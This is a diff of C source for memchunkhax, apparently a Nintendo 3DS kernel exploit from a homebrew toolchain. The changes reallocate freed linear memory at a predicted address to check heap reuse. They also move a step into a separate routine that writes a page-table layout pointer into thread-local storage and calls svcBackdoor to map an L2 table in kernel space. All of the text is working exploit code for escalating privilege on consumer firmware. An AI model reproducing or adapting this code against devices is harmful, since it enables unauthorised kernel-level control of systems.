@@ -79,6 +79,10 @@ static Result doMemchunkhax(u32 val1, u32 val2, void *workBuffer, Handle gspHand
     TRY(svcControlMemory(&tmp, bufVa + 0x2000, 0, 0x4000, MEMOP_FREE, MEMPERM_DONTCARE));
     TRY(svcControlMemory(&tmp, bufVa + 0x7000, 0, 0x9000, MEMOP_FREE, MEMPERM_DONTCARE));
 
+    // Realloc everything at what should be the same VA
+    TRY(svcControlMemory(&tmp, 0, 0, 0x10000, MEMOP_ALLOC_LINEAR, MEMPERM_READ | MEMPERM_WRITE));
+    res = tmp == (uintptr_t)workBuffer ? 0 : 0xDEAD1337;
+
     return res;
 }
 
@@ -92,10 +96,8 @@ static u32 leakCurThreadKernelStackAddr(void)
     return (u32)(out & ~0xFFF);
 }
 
-Result memchunkhax(const BlobLayout *layout, void *workBuffer, Handle gspHandle)
+Result memchunkhax(void *workBuffer, Handle gspHandle)
 {
-    (void)layout;
-
     // Use TLS as scratch area for memchunkhax
 
     Result res = 0;
@@ -108,12 +110,17 @@ Result memchunkhax(const BlobLayout *layout, void *workBuffer, Handle gspHandle)
     u32 targetAddr = (kernStackAddr + 0xF38 + 0x7B / 8) & ~3;
     TRY(doMemchunkhax(targetAddr, (u32)scratch, workBuffer, gspHandle));
 
+    return res;
+}
+
+void mapL2TableViaSvc0x7b(const BlobLayout *layout)
+{
+    u32 *scratch = getThreadCommandBuffer();
+
     // Do the thing:
     *scratch = (u32)layout;
     svcBackdoor(kMapL2Table);
 
     __dsb();
     __flush_prefetch_buffer();
-
-    return res;
 }
